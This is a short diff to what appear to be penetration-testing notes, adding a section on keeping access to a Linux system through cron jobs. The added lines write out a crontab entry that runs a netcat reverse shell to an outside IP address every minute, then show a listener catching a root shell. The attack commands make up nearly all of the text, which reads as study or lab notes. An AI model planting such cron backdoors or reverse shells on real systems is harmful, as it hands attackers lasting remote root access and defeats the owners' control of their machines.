@@ -89,6 +89,24 @@ meterpreter >  whoami
 (Technique 5) Setup Persistance w/ cronjobs
 
 
+$ cat /etc/crontab
+$ crontab -e
+     - add * * * * * nc 10.10.10.10. 1234 -e /bin/bash
+$ crontab -l                                            #(see the installation)
+
+
+$ nc -nvlp 1234
+      - id
+      - uid=0(root)
+
+
+
+
+
+
+
+
+
 
 
 
